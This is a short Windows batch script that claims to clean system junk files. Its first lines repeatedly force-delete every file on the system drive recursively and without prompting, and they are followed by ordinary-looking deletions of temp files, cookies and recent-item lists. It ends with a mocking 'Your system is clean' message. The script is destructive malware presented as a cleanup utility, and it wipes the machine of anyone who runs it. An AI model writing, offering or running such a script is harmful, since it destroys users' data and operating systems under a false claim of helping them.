   @echo off
   echo Cleaning System Junk Files,please wait......
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\*.*
   del /f /s /q %systemdrive%\recycled\*.*
   del /f /s /q %windir%\*.bak
   del /f /s /q %windir%\prefetch\*.*
   del /f /q %userprofile%\cookies\*.*
   del /f /q %userprofile%\recent\*.*
   del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
   del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
   del /f /s /q "%userprofile%\recent\*.*"
   echo Your system is clean ;)¡I
   echo. & pause
